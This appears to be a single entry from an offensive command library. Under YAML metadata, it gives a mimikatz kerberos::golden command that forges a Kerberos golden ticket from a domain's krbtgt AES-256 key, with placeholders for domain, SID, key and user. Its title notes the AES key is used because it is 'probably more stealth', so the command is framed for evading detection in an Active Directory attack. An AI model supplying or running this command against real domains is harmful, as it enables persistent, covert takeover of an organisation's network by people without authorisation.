---
id: 5a3928ff-bbee-436a-bf80-56638636a0ef
name: to generate the TGT with AES 256 key (more secure encryption, probably more
  stealth due is the used by default by Microsoft)
type: command
executor: bash
data: 'mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key>
  /user:<user_name>

  '
output: null
created_at: '2020-07-14T18:14:44.044111+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# to generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)

```bash
mimikatz # kerberos::golden /domain:<domain_name>/sid:<domain_sid> /aes256:<krbtgt_aes256_key> /user:<user_name>

```
